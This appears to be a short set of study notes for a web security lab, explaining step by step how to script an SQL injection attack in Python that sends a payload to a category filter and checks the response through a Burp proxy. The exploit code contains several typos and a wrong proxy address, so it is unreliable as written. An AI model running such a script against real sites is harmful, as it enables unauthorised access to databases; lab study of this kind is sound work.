# Script The Attack using Python

## How To Script SQLi attack 

### 1. Import the request library

- allow you to make HTTP request

```
import requests   
import sys  
import urllib3  
```

### 2. Set the proxy settings 

- great way of debugging why the script is not working.
- whenever the script run, it will pass it through the proxy (burp) 
- request and response pass though the proxy server.

```
proxies = {'http' : 'http://127.0.0.0:8080', 'https' : 'http://127.0.0.0:8080'}
```

### 3. Create main method

what will happen in this main method?

- when script runs: 
    - give it 2 `command line parameter`
        1. URL of the application
        2. SQLi payload
    - else, throw an exception.


```
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] input invalid");
        print("[-] %s <url> <payload>" %sys.argv[0])
    
    if expolit_sqli(url,payload):
        print("[+] SQLi successful")
    else:
        print("[-] SQLi failed")
```

### 4. define the function:

```
def exploit_sqli(url,payload):
    uri = '/filter?category='

    getRequest = requests.get(url + uri + payload, verify=False, proxies=proxies)

    if "Cat Grin" iin getRequest.text:
        return True
    else:
        return False
```

- URI is extracted from the `HTTP request`.
- `Cat Grin` is in the text of the `HTTP response` we got from the exploited payload response. 


